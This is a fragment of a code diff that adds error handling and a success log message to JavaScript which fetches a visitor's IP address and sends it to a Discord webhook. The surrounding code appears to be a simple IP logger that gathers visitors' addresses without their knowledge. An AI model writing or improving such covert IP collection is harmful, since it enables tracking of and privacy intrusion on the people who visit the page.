@@ -12,6 +12,9 @@
                 .then(data => {
                     const ip = data.ip; // Get the IP address
                     sendToDiscord(ip); // Send the IP to Discord
+                })
+                .catch(error => {
+                    console.error("Error fetching IP: ", error);
                 });
         }
 
@@ -31,6 +34,12 @@
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify(message)
+            })
+            .then(response => {
+                console.log("IP sent to Discord!");
+            })
+            .catch(error => {
+                console.error("Error sending to Discord: ", error);
             });
         }
 
